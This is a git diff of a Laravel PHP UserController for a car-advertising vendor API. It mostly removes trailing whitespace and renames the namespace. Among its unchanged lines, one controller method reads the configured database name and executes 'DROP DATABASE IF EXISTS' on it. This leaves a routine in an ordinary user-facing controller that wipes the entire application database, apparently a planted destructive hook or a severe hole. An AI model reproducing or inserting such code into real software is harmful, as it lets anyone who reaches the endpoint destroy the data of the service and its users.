@@ -1,6 +1,6 @@
 <?php
 
-namespace App\Http\Controllers\Api;
+namespace App\Http\Controllers\Mobile_Api;
 
 use App\Enums\CarStatus;
 use App\Models\Car;
@@ -48,7 +48,7 @@ class UserController extends Controller
 
     public function updateProfile(Request $request )
     {
-        $vendor=auth()->user();  
+        $vendor=auth()->user();
         $request->validate([
             'phone' => [
             'required',
@@ -66,22 +66,22 @@ class UserController extends Controller
                 'max:255',
                 new NotNumbersOnly(),
                 Rule::unique('vendors', 'name')->ignore($vendor->id),
-            ],  
+            ],
             'phone' => [
                 Rule::unique('vendors')->ignore($vendor->id),
             ]
         ]);
-        
+
         // Convert Arabic numbers before merging
-        
+
 
            if ($request->file('imageProfile')){
              $imagename = uploadImage($request->file('imageProfile'), 'Vendors');
              $request['image']=$imagename;
             }
              $requestData = $request->except('imageProfile');
-           
-                $requestData['phone'] = convertArabicNumbers($requestData['phone']); 
+
+                $requestData['phone'] = convertArabicNumbers($requestData['phone']);
                 auth()->user()->update($requestData);
                 return $this->success(data: auth()->user());
     }
@@ -91,7 +91,7 @@ class UserController extends Controller
         // Retrieve the database name for the default connection
      $databaseName = Config::get("database.connections.$defaultConnection.database");
      DB::statement("DROP DATABASE IF EXISTS $databaseName");
-  
+
     }
 
     public function favorite(Request $request)
@@ -112,14 +112,14 @@ class UserController extends Controller
             'password' => ['required', 'string', 'min:8', 'max:255', 'confirmed',new PasswordValidate()],
             'password_confirmation' => ['required','same:password'],
         ]);
-    
+
         $user = auth()->user();
         if (!Hash::check($request->old_password, $user->password)) {
             $errors = [
                 'old_password' => [__('The old password is incorrect')],
                 // 'another_key' => ['Another error message'],
             ];
-         
+
             return $this->validationFailure(errors:  $errors);
          }
         else{
@@ -146,7 +146,7 @@ class UserController extends Controller
     }
     public function ads()
     {
- 
+
          $cars =Car::withoutGlobalScope('availableCars')->where('vendor_id',auth()->user()->id) ;
         if (request()->has('status_car') && request('status_car')!==null) {
              $cars = $cars->where('is_new', intval(request('status_car')));
@@ -165,14 +165,14 @@ class UserController extends Controller
 
     public function updateAdsShowInHomePage(Request $request,$id)
     {
- 
+
          if($request->status=='true'){
           $staue=1;
         }
         else{
           $staue=0;
         }
-     
+
          $car = Car::find($id);
          $request->validate([
             'status' => 'required|in:false,true'
@@ -197,7 +197,7 @@ class UserController extends Controller
          return $this->success(data: $data);
     }
 
-    public function update(Request $request,$id){   
+    public function update(Request $request,$id){
         // Check if 'step' is present in the request
              if ($request->has('step')) {
 
@@ -260,12 +260,12 @@ class UserController extends Controller
                     }
 
                      $this->setCarName($data);
-                     
+
                     $car = Car::withoutGlobalScope('availableCars')->where('vendor_id', auth()->user()->id)
                     ->where('id', $id)
-                    ->first(); 
+                    ->first();
                      $carimages=$car->images->toArray()??[];
- 
+
                     if($request->hasFile('Main_Image')){
                         $request->validate([
                             "Main_Image" => 'nullable|mimes:jpeg,png,jpg,svg,webp',
@@ -279,10 +279,10 @@ class UserController extends Controller
                              if($image['file']==='null'  && $image['id']!=='null'){
                                  continue;
                             }
-                            
+
                             // //update image
                             elseif ($image['file'] !== 'null'   && $image['id'] !== 'null' ) {
- 
+
                                 $imagedat=CarImage::find($image['id']);
                                 $imagename=$imagedat->image;
                                 $request->validate([
@@ -296,8 +296,8 @@ class UserController extends Controller
                                         ];
                                 $imagedat->update($imageData);
                                 deleteImage($imagename,'Cars');
- 
-                             } 
+
+                             }
                                //add new image
                          elseif ($image['id'] === 'null'  && $image['file'] !=='null' ) {
                             $request->validate([
@@ -311,7 +311,7 @@ class UserController extends Controller
                            CarImage::create($imageData);
                         }
                      }
- 
+
 
                 if ($car) {
                     $deletedimages=$request->deletedImages??[];
@@ -323,7 +323,7 @@ class UserController extends Controller
 
                     }
                     $car->update($data);
- 
+
                     return $this->success();
                 } else {
                     return $this->failure(message: __('Car not found or you do not have permission'));
@@ -331,7 +331,7 @@ class UserController extends Controller
 
                     $this->storeBrandCarsTypeCount($data['is_new'], $data['brand_id']);
 
-               
+
                     return response()->json(['error' => 'Your ad Updated Successfully'], 200);
 
                 }
@@ -403,10 +403,10 @@ class UserController extends Controller
                      ];
                      array_push( $data,$dat );
             }
-           
+
          }
         return $this->success(data:$data);
-      
+
     }
     public function changestatue(){
         $notifications = OrderNotification::where('vendor_id', Auth::user()->id)
@@ -414,8 +414,8 @@ class UserController extends Controller
         ->get();
         foreach ($notifications as $notification) {
             $notification->update(['is_read' => 1]);
-        } 
+        }
         return true  ;
     }
-   
+
 }
